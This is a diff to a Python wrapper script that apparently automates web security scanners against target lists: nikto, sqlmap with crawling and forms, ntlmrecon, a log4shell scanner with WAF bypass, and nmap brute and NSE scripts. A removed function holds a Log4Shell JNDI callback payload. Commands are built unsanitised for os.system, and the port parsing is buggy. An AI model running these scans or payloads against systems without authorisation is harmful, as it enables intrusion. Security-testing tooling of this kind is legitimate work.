@@ -40,20 +40,43 @@ elif sys.argv[1] == "show":
     os.system("find %s -name '*.txt' -o -name '*.nmap' -exec cat {} \; | less -R" % sys.argv[2])
     sys.exit()
 
-elif len(sys.argv) < 4:
+elif len(sys.argv) < 3:
   sys.exit(usage)
 
 directory_name = "output"
 option = sys.argv[1]
-service_proto = sys.argv[2]
-service_port = sys.argv[3]
-targets_option = sys.argv[4]
+service_proto = ''
+service_port = ''
+targets_option = ''
 web_root = "/"
-if len(sys.argv) == 6:
-  web_root = sys.argv[5]
+
+if "://" in sys.argv[2]:
+  service_proto = sys.argv[2].split(":")[0]
+  targets_option = sys.argv[2].split("/")[2].split(":")[0]
+  if sys.argv[2].split("/")[3]:
+    web_root = web_root + sys.argv[2].split("/")[3] + web_root
+  if sys.argv[1] == "log4shell":
+    interface = sys.argv[3]
+  try:
+    service_port = int(sys.argv[2].split(":")[2]).split("/")[0]
+  except:
+    if "http" == service_proto:
+      service_port = "80"
+    elif "https" == service_proto:
+      service_port = "443"
+
+else:
+  service_proto = sys.argv[2]
+  service_port = sys.argv[3]
+  targets_option = sys.argv[4]
+  if len(sys.argv) == 6:
+    web_root = sys.argv[5]
+  if len(sys.argv) == 7:
+    interface = sys.argv[6]
+
 user = os.environ.get('USER')
 wpscan_api = "{YOUR_API_KEY}"
-nikto_config = "/usr/share/nikto/nikto.conf"
+nikto_config = "/etc/nikto.conf"
 targets = []
 
 #sys.stdout = open(directory_name + '/' + sys.argv[0] + ".log", 'w')
@@ -89,7 +112,11 @@ def run_whatweb(service_proto, host_address, service_port, web_root):
 def run_nikto(service_proto, host_address, service_port, web_root):
     if not os.path.exists(nikto_config): sys.exit("%s does not exist. Please modify the nikto_config variable." % nikto_config)
     print("\n\n[*] Running nikto on %s://%s:%s%s" % (service_proto, host_address, service_port, web_root))
-    cmd = "nikto -config %s -timeout 2 -nossl -host %s://%s:%s%s -F xml -output %s/pya-nikto-output-%s-%s-%s.xml | tee %s/pya-nikto-output-%s-%s-%s.txt" % (nikto_config, service_proto, host_address, service_port, web_root, directory_name, host_address, service_port,service_proto, directory_name, host_address, service_port, service_proto)
+    if len(web_root) > 1:
+      web_folder = web_root.split("/")[1]
+      cmd = "nikto -config %s -timeout 2 -nossl -host %s://%s:%s%s -F xml -output %s/pya-nikto-output-%s-%s-%s-%s.xml | tee %s/pya-nikto-output-%s-%s-%s-%s.txt" % (nikto_config, service_proto, host_address, service_port, web_root, directory_name, host_address, service_port, service_proto, web_folder, directory_name, host_address, service_port, service_proto, web_folder)
+    else:
+      cmd = "nikto -config %s -timeout 2 -nossl -host %s://%s:%s%s -F xml -output %s/pya-nikto-output-%s-%s-%s.xml | tee %s/pya-nikto-output-%s-%s-%s.txt" % (nikto_config, service_proto, host_address, service_port, web_root, directory_name, host_address, service_port,service_proto, directory_name, host_address, service_port, service_proto)
     print("%s@%s:~$ %s" % (user, get_public_ip(), cmd))
     os.system(cmd)
 
@@ -105,13 +132,11 @@ def run_wpscan(service_proto, host_address, service_port, web_root):
 # wget http://ftp.us.debian.org/debian/pool/main/s/sqlmap/sqlmap_1.5.2-1_all.deb
 # sudo dpkg -i sqlmap_1.5.2-1_all.deb
 
-def run_sqlmap_crawl(service_proto, host_address, service_port, web_root):
+def run_sqlmap(service_proto, host_address, service_port, web_root):
     print("\n\n[*] Running sqlmap_crawl on %s://%s:%s%s" % (service_proto, host_address, service_port, web_root))
     cmd = "sqlmap --random-agent --batch --smart --crawl=4 --threads=3 --level=4 --risk=2 -u %s://%s:%s%s | tee %s/pya-sqlmap-crawl-output-%s-%s-%s.txt" % (service_proto, host_address, service_port, web_root, directory_name, host_address, service_port, service_proto)
     print("%s@%s:~$ %s" % (user, get_public_ip(), cmd))
     os.system(cmd)
-
-def run_sqlmap_forms(service_proto, host_address, service_port, web_root):
     print("\n\n[*] Running sqlmap_forms on %s://%s:%s%s" % (service_proto, host_address, service_port, web_root))
     cmd = "sqlmap --random-agent --batch --smart --crawl=4  --forms --threads=3 --level=4 --risk=2 -u %s://%s:%s%s | tee %s/pya-sqlmap-forms-output-%s-%s-%s.txt" % (service_proto, host_address, service_port, web_root, directory_name, host_address, service_port, service_proto)
     print("%s@%s:~$ %s" % (user, get_public_ip(), cmd))
@@ -124,10 +149,14 @@ def run_nmap_tomcat(service_proto, host_address, service_port, web_root):
     print("%s@%s:~$ %s" % (user, get_public_ip(), cmd))
     os.system(cmd)
 
-def run_wascan(service_proto, host_address, service_port, web_root):
-    if not os.path.exists("wascan-m4ll0k"): os.system("git clone --quiet https://github.com/m4ll0k/WAScan wascan-m4ll0k")
-    print("\n\n[*] Running wascan on %s://%s:%s%s" % (service_proto, host_address, service_port, web_root))
-    cmd = "cd wascan-m4ll0k/; python2.7 wascan.py --url %s://%s:%s%s --scan 5 --ragent -v | tee ../%s/pya-wascan-output-%s-%s-%s.txt" % (service_proto, host_address, service_port, web_root, directory_name, host_address, service_port, service_proto)
+def run_ntlmrecon(service_proto, host_address, service_port, web_root):
+    try:
+        import ntlmrecon;
+    except ImportError as e:
+        os.system("pip3 install ntlmrecon")
+        pass
+    print("\n\n[*] Running ntlmrecon on %s://%s:%s" % (service_proto, host_address, service_port))
+    cmd = "ntlmrecon --random-user-agent --force-all -f --outfile %s/pya-ntlmrecon-output-%s-%s-%s.txt --input %s://%s:%s" % (directory_name, host_address, service_port, service_proto, service_proto, host_address, service_port)
     print("%s@%s:~$ %s" % (user, get_public_ip(), cmd))
     os.system(cmd)
 
@@ -155,14 +184,12 @@ def run_jetleak(service_proto, host_address, service_port, web_root):
     print("%s@%s:~$ %s" % (user, get_public_ip(), cmd))
     os.system(cmd)
 
-def run_log4j_scan(service_proto, host_address, service_port, web_root):
+def run_log4shell(service_proto, host_address, service_port, web_root, interface):
     import netifaces as ni
-    eth0_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
-    #print("Don't forget to run this: tcpdump -i eth0 -nn dst %s and dst port 53" eth0_ip)
-    #input("Press Enter to continue...")
-    if not os.path.exists("cisagov-log4j-scanner"): os.system("git clone --quiet https://github.com/cisagov/log4j-scanner cisagov-log4j-scanner")
+    int_ip = ni.ifaddresses('%s' % interface)[ni.AF_INET][0]['addr']
+    if not os.path.exists("cisagov-log4j-scanner"): os.system("git clone --quiet https://github.com/cisagov/log4j-scanner cisagov-log4j-scanner; pip3 install -r cisagov-log4j-scanner/log4-scanner/requirements.txt")
     print("\n\n[*] Running log4j-scan.py on %s://%s:%s%s" % (service_proto, host_address, service_port, web_root))
-    cmd = "python3 cisagov-log4j-scanner/log4-scanner/log4j-scan.py --run-all-tests --headers-file cisagov-log4j-scanner/log4-scanner/headers-large.txt --disable-http-redirects --custom-dns-callback-host %s:1389 -u %s://%s:%s%s | tee %s/pya-log4j-scan-output-%s-%s-%s.txt" % (eth0_ip, service_proto, host_address, service_port, web_root, directory_name, host_address, service_port, service_proto)
+    cmd = "python3 cisagov-log4j-scanner/log4-scanner/log4j-scan.py --run-all-tests --waf-bypass --headers-file cisagov-log4j-scanner/log4-scanner/headers-large.txt --disable-http-redirects --custom-dns-callback-host %s:1389 -u %s://%s:%s%s | tee %s/pya-log4j-scan-output-%s-%s-%s.txt" % (int_ip, service_proto, host_address, service_port, web_root, directory_name, host_address, service_port, service_proto)
     print("%s@%s:~$ %s" % (user, get_public_ip(), cmd))
     os.system(cmd)
 
@@ -175,18 +202,10 @@ def run_dirb(service_proto, host_address, service_port, web_root):
 def run_sslyze(service_proto, host_address, service_port, web_root):
     if not os.path.exists("sslyze-nabla-c0d3"): os.system("git clone --quiet https://github.com/nabla-c0d3/sslyze.git sslyze-nabla-c0d3 && sudo pip3 install --upgrade sslyze")
     print("\n\n[*] Running sslyze on %s://%s:%s%s" % (service_proto, host_address, service_port, web_root))
-    cmd = "sslyze --regular %s:%s > %s/pya-sslyze-output-%s-%s.txt" % (host_address, service_port, directory_name, host_address, service_port)
+    cmd = "sslyze %s:%s > %s/pya-sslyze-output-%s-%s.txt" % (host_address, service_port, directory_name, host_address, service_port)
     print("%s@%s:~$ %s" % (user, get_public_ip(), cmd))
     os.system(cmd)
     os.system("cat %s/pya-sslyze-output-%s-%s.txt" % (directory_name, host_address, service_port))
-
-def run_nmap_log4j(service_proto, host_address, service_port, web_root):
-    import netifaces as ni
-    eth0_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
-    print("\n\n[*] Running nmaplog4j on %s://%s:%s%s" % (service_proto, host_address, service_port, web_root))
-    cmd = "nmap -n -Pn -sTV -p %s --script $PWD/ --script-args log4shell.payload=\"\${jndi:ldap://%s:1389}\" --open -oA %s/pya-nmap-log4j-output-%s-tcp %s" % (service_port, eth0_ip, directory_name, host_address, host_address)
-    print("%s@%s:~$ %s" % (user, get_public_ip(), cmd))
-    os.system(cmd)
 
 def run_nmap_scripts(service_proto, host_address, service_port, web_root):
     print("\n\n[*] Running nmapnse on %s://%s:%s%s" % (service_proto, host_address, service_port, web_root))
@@ -257,10 +276,10 @@ elif option == "sqlmap":
     host_address = row.rstrip()
     run_sqlmap(service_proto, host_address, service_port, web_root)
 
-elif option == "wascan":
+elif option == "ntlmrecon":
   for row in targets:
     host_address = row.rstrip()
-    run_wascan(service_proto, host_address, service_port, web_root)
+    run_ntlmrecon(service_proto, host_address, service_port, web_root)
 
 elif option == "tomcat":
   for row in targets:
@@ -282,10 +301,10 @@ elif option == "jetleak":
     host_address = row.rstrip()
     run_jetleak(service_proto, host_address, service_port, web_root)
 
-elif option == "log4j":
+elif option == "log4shell":
   for row in targets:
     host_address = row.rstrip()
-    run_log4j_scan(service_proto, host_address, service_port, web_root)
+    run_log4shell(service_proto, host_address, service_port, web_root, interface)
 
 elif option == "dirb":
   for row in targets:
@@ -293,21 +312,17 @@ elif option == "dirb":
     run_dirb(service_proto, host_address, service_port, web_root)
 
 elif option == "sslyze":
+  os.system('sudo sslyze --update_trust_stores')
   for row in targets:
     host_address = row.rstrip()
     run_sslyze(service_proto, host_address, service_port, web_root)
 
-elif option == "nselog4j":
-  for row in targets:
-    host_address = row.rstrip()
-    run_nmap_log4j(service_proto, host_address, service_port, web_root)
-
-elif option == "nse":
+elif option == "nmap_scripts":
   for row in targets:
     host_address = row.rstrip()
     run_nmap_scripts(service_proto, host_address, service_port, web_root)
 
-elif option == "brute":
+elif option == "nmap_brute":
   for row in targets:
     host_address = row.rstrip()
     run_nmap_brute(service_proto, host_address, service_port, web_root)
@@ -316,3 +331,4 @@ else:
   sys.exit('[!] The supplied option failed!')
 
 sys.stdout.close()
+
